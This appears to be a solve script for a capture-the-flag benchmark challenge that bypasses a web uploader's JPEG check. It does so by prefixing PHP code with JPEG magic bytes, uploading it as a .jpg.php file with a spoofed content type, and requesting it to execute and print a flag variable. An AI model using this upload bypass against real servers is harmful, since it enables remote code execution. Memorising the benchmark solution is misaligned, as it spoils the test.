#!/usr/bin/env bash
# XBEN-067-24 — upload filter bypass via a fake magic number. Proxy-mode twin.
# The uploader checks for a JPEG header, so the payload starts with the JPEG
# magic bytes and then carries PHP; saved as .php under /upload, it executes and
# prints the FLAG env var.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
NAME="probe$$.jpg.php"
SESSION="xben067p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/index.php"; BASE="$(req_of GET index.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
PAYLOAD="$(mktemp)"; printf '\377\330<?php echo getenv("FLAG"); ?>' > "$PAYLOAD"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/index.php' \
  --set "multipart.userfile.filename=$NAME" \
  --set 'multipart.userfile.content_type=image/jpeg' \
  --set-file "multipart.userfile=$PAYLOAD" >/dev/null
rm -f "$PAYLOAD"
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set "path=/upload/$NAME" >/dev/null
print_flag
